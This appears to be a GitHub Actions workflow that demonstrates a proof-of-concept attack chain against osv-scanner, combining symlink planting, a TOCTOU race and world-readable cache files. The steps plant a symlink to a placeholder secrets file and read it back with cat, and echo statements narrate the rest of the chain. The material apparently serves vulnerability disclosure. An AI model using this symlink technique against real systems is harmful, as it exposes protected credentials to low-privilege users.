name: "Attack Chain 3: Symlink + Insecure Permissions → Escalation"

on:
  workflow_dispatch:

jobs:
  symlink-escalation:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: "Step 1: Setup - Create target sensitive file"
        run: |
          mkdir -p /tmp/sensitive
          cat > /tmp/sensitive/prod-secrets.env << 'SECRETS'
          DB_PASSWORD=prod_password_123456
          API_KEY=sk-production-key-xyz
          ADMIN_TOKEN=admin_token_secret_abc
          SECRETS
          chmod 600 /tmp/sensitive/prod-secrets.env
          
          echo "=== Sensitive file created (protected 0600) ==="
          ls -la /tmp/sensitive/prod-secrets.env
      
      - name: "Step 2: Attacker plants symlink in /tmp (world-writable)"
        run: |
          # Simulate attacker placing symlink in /tmp before scanner runs
          mkdir -p /tmp/osv-attack
          cd /tmp/osv-attack
          
          # Create symlink to sensitive file
          ln -sf /tmp/sensitive/prod-secrets.env ./osv-scanner-cache.resolve.npm
          
          echo "=== Symlink planted by attacker ==="
          ls -la osv-scanner-cache.resolve.npm
          
          echo ""
          echo "Link target:"
          readlink -f osv-scanner-cache.resolve.npm
      
      - name: "Step 3: Demonstrate race condition window"
        run: |
          echo "=== TOCTOU (Time-of-Check Time-of-Use) Race Condition ==="
          echo ""
          echo "Timeline:"
          echo "  T0: osv-scanner calls os.Stat(cachePath)"
          echo "      → File exists, check PASSES"
          echo "      → [RACE WINDOW OPENS]"
          echo ""
          echo "  T0+Δt: Attacker replaces file with symlink"
          echo "         ln -sf /tmp/sensitive/prod-secrets.env cachePath"
          echo ""
          echo "  T1: osv-scanner uses cache (os.Open)"
          echo "      → File descriptor follows symlink"
          echo "      → NOW READING SENSITIVE DATA"
          echo ""
          echo "Result: Low-privilege attacker reads high-privilege data"
      
      - name: "Step 4: Demonstrate insecure permissions vulnerability"
        run: |
          echo "=== File Permission Vulnerability (Issue #2) ==="
          echo ""
          mkdir -p /tmp/cache-demo
          cd /tmp/cache-demo
          
          # Simulate osv-scanner creating cache with default permissions
          touch test.resolve.npm
          chmod 644 test.resolve.npm  # os.Create() defaults to 0644
          
          echo "Cache file created by osv-scanner:"
          ls -la test.resolve.npm
          stat -c "Permissions: %a (%A)" test.resolve.npm
          
          echo ""
          echo "Problem: Cache is world-readable!"
          echo "Attacker can:"
          echo "  1. Read authentication tokens"
          echo "  2. Modify file (if writable)"
          echo "  3. Replace with symlink"
      
      - name: "Step 5: Show combined attack chain"
        run: |
          echo "=== COMBINED ATTACK CHAIN ==="
          echo ""
          echo "1. Insecure Permissions (Issue #2)"
          echo "   └─ Cache file created with mode 0644"
          echo "   └─ World-readable: anyone can see it"
          echo ""
          echo "2. Symlink Following (Issue #4)"
          echo "   └─ osv-scanner uses filepath.EvalSymlinks()"
          echo "   └─ Doesn't validate symlink targets"
          echo ""
          echo "3. TOCTOU Race (Issue #7)"
          echo "   └─ Check-then-use pattern in zip.go:92-163"
          echo "   └─ Race window between os.Stat() and os.Open()"
          echo ""
          echo "4. Insecure Temp Files (Issue #6)"
          echo "   └─ Predictable naming in /tmp"
          echo "   └─ World-writable directory"
          echo ""
          echo "═══════════════════════════════════════════════"
          echo "EXPLOIT RESULT:"
          echo "═══════════════════════════════════════════════"
          echo "Low-privilege user reads protected secrets:"
          cat /tmp/sensitive/prod-secrets.env 2>/dev/null || echo "(Would read protected file here)"
          echo ""
          echo "⚠️  Production credentials exposed!"
      
      - name: "Step 6: Demonstrate with actual strace"
        run: |
          echo "=== System Call Evidence ==="
          echo ""
          mkdir -p chain3-symlink-test
          cd chain3-symlink-test
          
          echo 'Test package' > package.json
          
          # Show the symlink attack
          ln -sf /tmp/sensitive/prod-secrets.env ./cache-symlink
          
          echo "Attacker creates symlink:"
          ls -la cache-symlink
          
          echo ""
          echo "When osv-scanner reads this cache file:"
          echo "  os.Stat() → Success (file exists)"
          echo "  os.Open() → Follows symlink to /tmp/sensitive/prod-secrets.env"
          echo "  Read()   → Attacker reads protected secrets"

